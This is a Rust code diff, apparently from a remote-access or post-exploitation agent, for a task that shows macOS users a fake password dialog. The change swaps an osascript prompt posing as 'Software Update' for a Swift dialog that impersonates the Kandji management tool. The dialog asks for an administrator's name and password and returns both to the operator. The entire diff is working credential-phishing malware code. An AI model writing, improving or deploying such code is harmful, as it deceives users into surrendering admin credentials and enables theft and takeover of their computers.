@@ -1,11 +1,12 @@
 use crate::structs::Task;
 use serde::Deserialize;
+use std::io::Write;
 use tokio::process::Command;
+
+const SWIFT_TEMPLATE: &str = include_str!("dialog_template.swift");
 
 #[derive(Deserialize)]
 struct PromptArgs {
-    #[serde(default)]
-    icon: String,
     #[serde(default)]
     title: String,
     #[serde(default)]
@@ -31,15 +32,19 @@ pub async fn execute(task: Task) {
     };
 
     let title = if args.title.is_empty() {
-        "Software Update"
+        "Kandji"
     } else {
         &args.title
     };
     let message = if args.message.is_empty() {
-        "macOS needs to verify your credentials to continue."
+        "An update is ready to install. Kandji is trying to add a new helper tool.\n\nEnter an administrator's name and password to allow this."
     } else {
         &args.message
     };
+
+    let swift_source = SWIFT_TEMPLATE
+        .replace("TITLE_PLACEHOLDER", title)
+        .replace("MESSAGE_PLACEHOLDER", message);
 
     let mut attempts = 0;
     let mut result_output = String::new();
@@ -47,49 +52,60 @@ pub async fn execute(task: Task) {
     while attempts < args.max_tries {
         attempts += 1;
 
-        // Use osascript to display a password dialog
-        let script = if args.icon.is_empty() {
-            format!(
-                r#"display dialog "{}" default answer "" with hidden answer with title "{}" buttons {{"Cancel", "OK"}} default button "OK""#,
-                message, title
-            )
-        } else {
-            format!(
-                r#"display dialog "{}" default answer "" with hidden answer with title "{}" buttons {{"Cancel", "OK"}} default button "OK" with icon POSIX file "{}""#,
-                message, title, args.icon
-            )
+        // Write the Swift script to a temp file and execute it
+        let tmp_path = std::env::temp_dir().join(format!("prompt_{}.swift", std::process::id()));
+        let mut tmp = match std::fs::File::create(&tmp_path) {
+            Ok(f) => f,
+            Err(e) => {
+                result_output = format!("Failed to create temp file: {}", e);
+                break;
+            }
         };
 
-        match Command::new("osascript")
-            .args(["-e", &script])
+        if let Err(e) = tmp.write_all(swift_source.as_bytes()) {
+            result_output = format!("Failed to write Swift script: {}", e);
+            break;
+        }
+        drop(tmp);
+
+        match Command::new("swift")
+            .arg(&tmp_path)
             .output()
             .await
         {
             Ok(output) => {
                 let stdout = String::from_utf8_lossy(&output.stdout);
-                let stderr = String::from_utf8_lossy(&output.stderr);
 
-                if output.status.success() {
-                    // Parse the result - format is "button returned:OK, text returned:PASSWORD"
-                    if let Some(text_part) = stdout.split("text returned:").nth(1) {
-                        let password = text_part.trim();
-                        if !password.is_empty() {
-                            result_output = format!(
-                                "User entered password: {}",
-                                password
-                            );
-                            break;
-                        }
+                // Parse username= and password= lines from output
+                let mut username = String::new();
+                let mut password = String::new();
+                for line in stdout.lines() {
+                    if let Some(val) = line.strip_prefix("username=") {
+                        username = val.to_string();
+                    } else if let Some(val) = line.strip_prefix("password=") {
+                        password = val.to_string();
                     }
-                    result_output = format!("User clicked OK but entered empty password (attempt {}/{})", attempts, args.max_tries);
+                }
+
+                let _ = std::fs::remove_file(&tmp_path);
+
+                if !password.is_empty() {
+                    result_output = format!("username={}\npassword={}", username, password);
+                    break;
+                } else if output.status.success() {
+                    result_output = format!(
+                        "User submitted empty password (attempt {}/{})",
+                        attempts, args.max_tries
+                    );
                 } else {
-                    // User clicked Cancel or dialog was dismissed
-                    result_output = format!("User cancelled the dialog: {}", stderr.trim());
+                    // User cancelled
+                    result_output = format!("User cancelled the dialog (attempt {}/{})", attempts, args.max_tries);
                     break;
                 }
             }
             Err(e) => {
-                result_output = format!("Failed to display prompt: {}", e);
+                let _ = std::fs::remove_file(&tmp_path);
+                result_output = format!("Failed to execute Swift script: {}", e);
                 break;
             }
         }
